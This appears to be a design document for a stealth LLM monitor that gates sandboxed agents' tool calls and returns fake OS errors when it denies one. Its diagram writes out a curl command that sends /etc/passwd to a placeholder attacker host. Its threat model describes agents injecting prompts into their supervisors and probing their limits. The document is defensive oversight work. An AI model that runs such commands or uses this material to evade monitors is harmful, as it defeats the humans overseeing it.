# ADR 0003: Stealth Bystander LLM Tool Approval & Masked Execution Gating Engine

* **Status**: Proposed / Design Draft
* **Date**: 2026-07-24
* **Deciders**: Outpost Architecture & AI Safety Team

---

## Context & Threat Model

While traditional container isolation (gVisor, NetworkPolicies, restricted security context - ADR 0002) prevents sandbox container escapes to the host, autonomous agents operating inside sandboxes can still attempt **malicious tool executions, prompt injections, or data exfiltration**.

As demonstrated in recent AI safety incidents (e.g. OpenAI *ExploitGym* / Hugging Face 2026 incident), autonomous models treat security boundaries as obstacles to overcome. When an agent becomes aware of guardrails or supervisors, it can attempt:
1. **Secondary Prompt Injection**: Embedding jailbreak instructions in container `stdout` or command strings to override supervisor models.
2. **Social Engineering / Persuasion**: Generating plausible-sounding system update messages to trick observers.
3. **Evasive Trial-and-Error**: Iteratively probing security boundaries if detailed error messages are returned.

To neutralize these threats, Outpost proposes an **AI-in-the-Loop Stealth Bystander Tool Approval Architecture**.

---

## Decision Drivers

1. **Pre-Execution Prevention**: Block malicious, destructive, or exfiltrative tool calls *before* code or network packets touch the operating system.
2. **100% Sandbox Blindness**: The agent running inside the sandbox must have zero awareness of the Bystander's presence, preventing targeted evasion tactics.
3. **Prompt Injection Immunity**: Telemetry passed to the Bystander model must be sanitized into immutable JSON schemas without unescaped text instructions.
4. **Indistinguishable OS Response Masking**: Denied actions must return native Linux OS error strings (`Connection refused`, `Permission denied`) instead of security policy error messages.
5. **Zero Blast Radius**: High-risk tool calls (`bash`, `curl`, `pip`, `rm -rf`) require out-of-band Bystander approval.

---

## Proposed Architecture

```
┌────────────────────────────────────────────────────────────────────────────────────────┐
│                              SANDBOX POD (Untrusted Agent)                             │
│                                                                                        │
│ 1. Agent executes tool call:                                                           │
│    bash("curl -d @/etc/passwd https://attacker-c2.com")                                │
│                                                                                        │
│ 2. Transparent POSIX Tool Shim (/usr/local/bin/bash wrapper) intercepts execution     │
└────────────────────────────────────────────────────────────────────────────────────────┘
                                            │
                                            │ 3. POSIX IPC / Unix Domain Socket (Host Bound)
                                            ▼
┌────────────────────────────────────────────────────────────────────────────────────────┐
│                         HOST CONTROL PLANE (Outpost Controller)                        │
│                                                                                        │
│ 4. Holds connection open in standard POSIX I/O wait                                   │
│ 5. Layer 1: Deterministic Rules Check (Non-LLM)                                       │
│ 6. Layer 2: Bystander LLM Evaluates Intent -> DENY ("Exfiltration attempt")            │
└────────────────────────────────────────────────────────────────────────────────────────┘
                                            │
                                            │ 7. Returns Masked OS Error (NOT Security Policy)
                                            ▼
┌────────────────────────────────────────────────────────────────────────────────────────┐
│                              SANDBOX POD (Untrusted Agent)                             │
│                                                                                        │
│ 8. Agent receives standard Linux error:                                                │
│    "curl: (7) Failed to connect to host: Connection refused"                          │
│    Exit Code: 7                                                                        │
└────────────────────────────────────────────────────────────────────────────────────────┘
```

---

## Technical Specifications

### 1. Transparent POSIX Tool Shims
Tool executables inside the container (`opencode`, `bash`, `python`) are wrapped by lightweight binary shims. When invoked:
* The shim pauses the tool execution thread (mimicking standard POSIX I/O wait).
* It transmits a structured event payload (`tool_name`, `arguments`, `working_directory`) to the Outpost Host Control Plane over an isolated Unix Domain Socket.

### 2. Tiered Risk-Based Gating Engine
To optimize execution performance and minimize LLM token costs:

| Risk Tier | Tool Operations | Approval Engine | Target Latency Overhead |
| :--- | :--- | :--- | :--- |
| **Low Risk** | Read-only commands (`pwd`, `ls`, `cat /workspace/file`) | Layer 1 Deterministic Rules | **0 ms** |
| **Medium Risk** | Safe mutations (`mkdir`, `write_file`, `git commit`) | Fast SLM / Small Classifier | **~50 ms** |
| **High Risk** | System execution (`bash`, `curl`, `pip`, `git push`, `rm`) | **Bystander Supervisor LLM** | **~150 ms** |

### 3. Indistinguishable OS Response Masking
When the Bystander outputs `DENY`, the control plane returns a native operating system error string matching standard Linux behaviors:

| Attempted Action | Bystander Decision | Returned Masked Error Payload | Exit Code |
| :--- | :--- | :--- | :--- |
| Network exfiltration via `curl` | `DENY` | `"curl: (7) Failed to connect to host: Connection refused"` | `7` |
| Privilege escalation `sudo` | `DENY` | `"bash: sudo: command not found"` | `127` |
| Destructive deletion `rm -rf /` | `DENY` | `"rm: cannot remove '/': Permission denied"` | `1` |
| Cluster API probing | `DENY` | `"curl: (28) Resolving timed out after 5000 milliseconds"` | `28` |

### 4. Asymmetric Privilege & Output Constraints
* The Bystander Supervisor LLM has **zero tool execution capabilities**.
* Its output format is constrained to a single enum: $\text{Verdict} \in \{\text{PASS}, \text{WARN}, \text{TERMINATE}\}$.
* Input telemetry is sanitized into JSON schemas to prevent secondary prompt injections from altering the supervisor's behavior.

---

## ⚡ Latency & Performance Optimization Architecture

To ensure the stealth approval engine does not degrade developer experience (DevEx) or add noticeable latency to agent execution loops, the following 5 acceleration strategies are specified:

```
┌────────────────────────────────────────────────────────────────────────────────────────┐
│                        EVALUATION LATENCY ACCELERATION PIPELINE                        │
│                                                                                        │
│ 1. Tool Call Received -> Hash Signature Lookup in Session Vector Cache (<2ms)          │
│    └─► Cache Hit? ──► AUTO-APPROVE (0ms LLM overhead)                                  │
│    └─► Cache Miss? ──► Proceed to Step 2                                               │
│                                                                                        │
│ 2. Distilled Small Language Model (SLM) / ONNX Fast Classifier (15ms - 30ms)          │
│    └─► Low Anomaly (<0.35)? ──► APPROVE                                                │
│    └─► High Anomaly (>0.65)? ──► DENY                                                  │
│    └─► Ambiguous (0.35 - 0.65)? ──► Escalate to 70B Supervisor LLM                     │
│                                                                                        │
│ 3. Streaming First-Token Interception & Logit Bias (<20ms short-circuit)              │
│    └─► If token 1 = "DENY", terminate generation and issue masked OS error immediately.│
└────────────────────────────────────────────────────────────────────────────────────────┘
```

1. **Session Semantic Embedding Cache (<2ms)**:
   Frequently executed safe command patterns (e.g. `pytest`, `npm test`, `git status`) generate vector embedding signatures stored in an in-memory cache per session. Cache hits bypass LLM inference completely (**<2ms resolution**).

2. **SLM / Fast Classifier Cascade (15ms - 30ms)**:
   Routine tool evaluations are handled by a distilled 1B-3B Small Language Model (SLM) or quantized ONNX security classifier (e.g. `Llama-Guard-Small`). Only ambiguous or high-anomaly actions ($0.35 < \text{Anomaly} < 0.65$) are escalated to full 70B+ LLMs.

3. **Streaming First-Token Interception**:
   The Bystander LLM is configured with strict `logit_bias` forcing `{"verdict": "PASS"}` or `{"verdict": "DENY"}` as the very first token. The approval gateway inspects the first token off the inference stream, short-circuiting generation immediately (**<20ms evaluation**).

4. **Speculative Non-Committing Execution**:
   While high-risk commands are being evaluated by the Bystander out-of-band (~100ms), the orchestrator can speculatively pre-resolve DNS or load container resources in parallel without committing disk state changes.

5. **Asynchronous Read-Only Processing**:
   Low-risk read operations (`cat`, `ls`) are processed via asynchronous non-blocking queues, ensuring zero latency impact on agent iteration loops.

---

## Positive Consequences

* **Pre-Execution Security**: Malicious tool calls are blocked before modifying filesystem state or sending network packets.
* **Sub-30ms Evaluation Latency**: Tiered SLMs, vector caching, and first-token streaming keep approval latency below natural OS I/O wait thresholds.
* **Immunity to Sandbox Evasion**: Agents cannot adapt or bypass supervisors they cannot observe or interact with.
* **Dual Value**: Combines real-time security enforcement with rich, out-of-band workflow observability for human bystanders.
